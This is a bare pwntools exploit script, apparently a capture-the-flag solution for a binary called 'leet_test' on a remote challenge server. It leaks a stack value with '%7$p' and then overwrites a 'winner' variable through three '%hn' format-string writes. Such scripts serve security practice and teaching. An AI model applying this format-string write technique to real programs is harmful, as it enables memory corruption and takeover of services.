#!/usr/bin/python3

from pwn import * 

context.binary = exe = ELF('./leet_test',checksec=False)

#p = process()
p = remote('94.237.63.109',35734)

#gdb.attach(p,gdbscript='''
#           b*0x40139c
#           ''')

input()
p.sendlineafter(b'name: ',b'%7$p')
p.recvuntil(b'Hello, ')
leak = int(p.recvline()[:-9],16)

log.success(f"leak {hex(leak)}")
target = leak * 0x1337C0DE
log.info(f"target: {hex(target)}")
winner = 0x404078

target1 = target & 0xffff
target2 = target >> 16 & 0xffff
target3 =target >> 32

pack = {
        target1:winner,
        target2:winner+2,
        target3:winner+4,
        }
sort = sorted(pack)
for i in range(3):
    payload = f"%{sort[i]}c%13$hn".encode()
    payload = payload.ljust(24,b'a')
    payload += p64(pack[sort[i]])
    p.sendlineafter(b'name: ',payload)




p.interactive()
